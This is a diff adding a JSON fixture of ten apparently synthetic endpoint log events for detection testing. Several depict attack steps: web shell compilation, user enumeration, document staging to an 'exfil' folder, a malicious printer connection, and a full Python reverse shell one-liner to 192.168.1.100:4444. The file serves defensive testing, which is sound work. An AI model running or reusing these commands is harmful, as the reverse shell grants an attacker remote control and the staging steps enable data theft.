@@ -1,0 +1,151 @@
+[
+  {
+    "timestamp": "2025-09-08T16:40:00Z",
+    "host": "FRONTEND-WEB-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\inetpub\\wwwroot\\bin\\aspnet_compiler.exe",
+      "CommandLine": "aspnet_compiler.exe -v /app -p C:\\temp\\webshell.aspx",
+      "ProcessId": "3001",
+      "ParentProcessId": "2800",
+      "User": "FRONTEND-WEB-01\\iis_user",
+      "ParentImage": "C:\\Windows\\System32\\w3wp.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:41:00Z",
+    "host": "DATABASE-SRV-02",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlcmd.exe",
+      "CommandLine": "sqlcmd -S localhost -E -Q \"SELECT * FROM users WHERE admin=1\"",
+      "ProcessId": "4001",
+      "ParentProcessId": "3900",
+      "User": "DATABASE-SRV-02\\sql_admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:42:00Z",
+    "host": "FILE-SERVER-03",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\robocopy.exe",
+      "CommandLine": "robocopy C:\\Users\\admin\\Documents C:\\temp\\exfil /E /XO",
+      "ProcessId": "5001",
+      "ParentProcessId": "4900",
+      "User": "FILE-SERVER-03\\backup_user",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:43:00Z",
+    "host": "DOMAIN-CONTROLLER-04",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\dsquery.exe",
+      "CommandLine": "dsquery user -limit 0 | dsget user -samid -fn -ln -email",
+      "ProcessId": "6001",
+      "ParentProcessId": "5900",
+      "User": "DOMAIN-CONTROLLER-04\\domain_admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:44:00Z",
+    "host": "MAIL-SERVER-05",
+    "fields": {
+      "EventID": "3",
+      "Image": "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\EdgeTransport.exe",
+      "DestinationIp": "192.168.1.200",
+      "DestinationPort": "25",
+      "Protocol": "tcp",
+      "ProcessId": "7001",
+      "User": "MAIL-SERVER-05\\exchange_svc",
+      "Category": "network_connection",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:45:00Z",
+    "host": "WORKSTATION-LINUX-06",
+    "fields": {
+      "EventID": "1",
+      "Image": "/usr/bin/python3",
+      "CommandLine": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.100\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
+      "ProcessId": "8001",
+      "ParentProcessId": "7900",
+      "User": "WORKSTATION-LINUX-06\\developer",
+      "ParentImage": "/bin/bash",
+      "Category": "process_creation",
+      "Product": "linux"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:46:00Z",
+    "host": "BACKUP-SERVER-07",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Program Files\\Veeam\\Backup and Replication\\Backup\\Veeam.Backup.Extractor.exe",
+      "CommandLine": "Veeam.Backup.Extractor.exe -source C:\\Backups\\DB_Full.vbk -target C:\\temp\\extracted",
+      "ProcessId": "9001",
+      "ParentProcessId": "8900",
+      "User": "BACKUP-SERVER-07\\backup_admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:47:00Z",
+    "host": "FIREWALL-DMZ-08",
+    "fields": {
+      "EventID": "4625",
+      "LogonType": "8",
+      "SubjectUserName": "anonymous",
+      "TargetUserName": "admin",
+      "IpAddress": "203.0.113.100",
+      "WorkstationName": "EXTERNAL-ATTACKER",
+      "Category": "authentication",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:48:00Z",
+    "host": "MONITORING-SRV-09",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Program Files\\Splunk\\bin\\splunk.exe",
+      "CommandLine": "splunk search 'index=security earliest=-24h | eval decoded=base64decode(field) | table decoded'",
+      "ProcessId": "1001",
+      "ParentProcessId": "900",
+      "User": "MONITORING-SRV-09\\splunk_admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:49:00Z",
+    "host": "PRINT-SERVER-10",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\printui.exe",
+      "CommandLine": "printui.exe /s /t2 /c\\\\ATTACKER-PC /n \"EvilPrinter\"",
+      "ProcessId": "1101",
+      "ParentProcessId": "1000",
+      "User": "PRINT-SERVER-10\\print_svc",
+      "ParentImage": "C:\\Windows\\System32\\spoolsv.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  }
+]
